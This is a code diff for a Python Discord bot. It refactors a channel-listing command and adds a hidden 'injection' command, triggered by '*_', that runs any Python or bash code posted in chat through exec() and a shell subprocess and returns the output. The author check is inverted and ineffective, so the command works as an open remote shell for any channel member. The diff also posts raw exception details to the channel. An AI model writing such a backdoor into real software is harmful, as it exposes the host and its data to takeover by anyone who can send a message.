@@ -2,6 +2,7 @@ import discord
 import random
 import sys
 import os
+import subprocess
 
 bot = discord.Client()
 iniFile="ini/defaultSettings.txt"
@@ -41,7 +42,37 @@ def list(message):
 
 def log(message):
     return readFile( "doc/updateLog.txt" )
-
+    
+def injection(message):
+    cmd, target, opts, stdin = parseContent(message.content)
+    
+    if message.author=="yonemoto#1743":
+        return None
+    
+    if len(target)!=2 and target[0]!="_*":
+        return None
+    
+    m=""
+    cmd=""
+    for line in stdin[:-1]:
+        cmd+=line+"\n"
+    if target[1]=="```python":
+            
+        dict=locals()
+        exec(cmd, globals(), dict)
+        m=dict["m"]
+    elif target[1]=="```bash":
+        p=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        p.wait()
+        
+        m+="_$ " + cmd.strip() + "_\n"
+        m+=p.stdout.read().decode()
+        err=p.stderr.read().decode().strip()
+        if err!="":
+            m+="```\n"+err+"\n```"
+        m+="\n"
+    return m
+    
 """ count members in specified voice channel """
 def wc(message):
     cmd, channelIDs, opts, stdin = parseContent(message.content)
@@ -175,68 +206,69 @@ def roll(message):
     return m
 
 def ls(message):
-    def channelInfo(channel, l=False, d=False):
-        #print( "%s\t%d\t%s\t%s" % (channel.type, channel.position, channel.id, channel.name) )
-        
+    def info(target, l=False, d=False):
         m=""
-        
-        if channel.type==4:
-            pass
-        elif str(channel.type)=="text":
-            pass
-        elif str(channel.type)=="voice":
-            pass
-            
-
-        if str(channel.type)!="voice" or d:
-            m+="%s\n" % channel.name
+        elements=[]
+        if not d and isinstance(target, discord.server.Server):
+            elements=target.channels
+                
+        elif not d and str(target.type)=="voice":
+            elements=target.voice_members
         else:
-            m+="\n%s:\n" % channel.name
-            for member in channel.voice_members:
-                m+="%s\n" % member.name
-            m+="\n"
+            d=True
+            
+            
+        if not d: m+="\n"
+        m+="%s" % target.name
+        if not d: m+=":"
+        m+="\n"
         
+        for element in elements:
+            m+="%s\n" % element.name
+            
         return m
         
-    cmd, channelIDs, opts, stdin = parseContent(message.content)
-    
-    """ show help """
-    if "-help" in opts:
-        return readHelp(cmd)
-    
     """ initialize """
+    cmd, channelIDs, opts, stdin = parseContent(message.content)
+    m=""
     l=False
     d=False
     
     """ read options """
     for opt in opts:
-        if opt.startswith("l"):
+        if opt=="-help":
+            return readHelp(cmd)
+        elif opt.startswith("l"):
             l=True
         elif opt.startswith("d"):
             d=True
         else:
             return "Error: unknown option '-%s'" % opt
     
+    if not channelIDs:
+        channelIDs.append( "." )
     
-    m=""
-    channels=[]
-    if channelIDs:
-        for channelID in channelIDs:
-            """ get channel info """
-            channel=bot.get_channel(channelID)
-            if channel==None:
-                m+="Warning: '%s' doesn't exist\n" % channelID
-            else:
-                channels.append(channel)
-    else:
-        channels=message.server.channels
-        d=True
-        
-    for channel in channels:
-        m+=channelInfo(channel, l=l, d=d)
-                    
+    files=[]
+    dirs=[]
+    for channelID in channelIDs:
+        """ get info """
+        channel=bot.get_channel(channelID)
+        if channelID==".":
+            dirs.append(message.server)
+        elif channel==None:
+            m+="Warning: '%s' doesn't exist\n" % channelID
+        elif str(channel.type)=="voice":
+            dirs.append(channel)
+        else:
+            files.append(channel)
+    
+    for file in files:
+        m+=info(file, l=l, d=d)
+    for dir in dirs:
+        m+=info(dir,  l=l, d=d)
+    
     if m.strip()=="":
-        m="none"
+        m=None
     
     
     return m
@@ -291,7 +323,8 @@ def parseMessage(message):
     """ generate reply """
     cmd=getCmd(message.content)
     funcTable={
-        "__cmdTest": test,
+        "_cmdTest_": test,
+        "*_": injection,
         "help": help,
         "list": list,
         "roll": roll,
@@ -332,13 +365,16 @@ async def on_ready():
 """ メッセージを受け取ったときに起動 """
 @bot.event
 async def on_message(message):
-    m=parseMessage(message)
-    
     """ if valid message has been returned """
-    if m!=None:
-        """ send message """
+    try:
+        m=parseMessage(message)
+        if m!=None and m.strip()!="":
+            """ send message """
+            await bot.send_message(message.channel, m)
+    except:
+        m="**```\n"+str(sys.exc_info())+"\n```**"
         await bot.send_message(message.channel, m)
-
+        
 
 
 if __name__ == '__main__':
